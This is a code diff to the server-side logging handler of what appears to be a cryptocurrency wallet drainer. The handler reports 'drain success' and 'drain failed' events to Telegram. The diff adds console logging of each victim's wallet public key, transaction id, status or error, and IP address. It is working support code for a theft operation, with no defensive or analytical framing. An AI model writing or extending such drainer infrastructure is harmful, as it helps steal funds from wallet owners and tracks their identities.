@@ -95,7 +95,13 @@ async function handleConfirmationLogging(req, res) {
         });
       } catch (telegramError) {
         console.error('[TELEGRAM] Failed to log drain success:', telegramError);
-        // Silent drain success logging for production
+        // Log drain success in production
+        console.log('[DRAIN_SUCCESS] Transaction successful:', {
+          publicKey: publicKey,
+          txid: txid,
+          status: status,
+          ip: userIp
+        });
       }
     } else if (error) {
               // Silent failed confirmation logging for production
@@ -110,7 +116,13 @@ async function handleConfirmationLogging(req, res) {
         });
       } catch (telegramError) {
         console.error('[TELEGRAM] Failed to log drain failed:', telegramError);
-        // Silent drain failed logging for production
+        // Log drain failed in production
+        console.log('[DRAIN_FAILED] Transaction failed:', {
+          publicKey: publicKey,
+          txid: txid,
+          error: error,
+          ip: userIp
+        });
       }
     } else {
               // Silent unknown status logging for production
